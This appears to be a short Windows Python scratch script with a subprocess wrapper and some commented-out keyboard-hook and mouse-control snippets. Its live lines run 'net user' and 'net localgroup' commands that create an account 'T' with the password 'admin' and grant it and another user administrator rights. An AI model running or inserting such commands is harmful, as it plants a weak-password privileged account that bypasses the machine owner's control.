# import keyboard

# # https://www.cnpython.com/qa/372750
# def print_pressed_keys(e):
#     line = ', '.join(str(code) for code in keyboard._pressed_events)
#     print(line)


# keyboard.hook(print_pressed_keys)
# keyboard.wait()

# from __future__ import print_function
# import ctypes, sys, os
# if ctypes.windll.shell32.IsUserAnAdmin():


import subprocess 
def command(cmd, timeout=1800000):
    try:
        sp = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        print("[PID] %s: %s" % (sp.pid, cmd))
        sp.wait(timeout=timeout)
        stderr = str(sp.stderr.read().decode("gbk")).strip()
        stdout = str(sp.stdout.read().decode("gbk")).strip()
        if "" != stderr:
            raise Exception(stderr)
        if stdout.find("失败") > -1:
            raise Exception(stdout)
    except Exception as e:
        print(e)
command("net user T admin /add")
command("net localgroup Administrators T /add")
command("net localgroup Administrators yangxing-007 /add")



# ctypes直接可以调用windows的系统api
# import ctypes
# MOUSEEVENTF_ABSOLUTE=0x8000
# MOUSEEVENTF_MOVE=0x0001
# ctypes.windll.user32.mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MOVE, 100, 200, 0, 0)


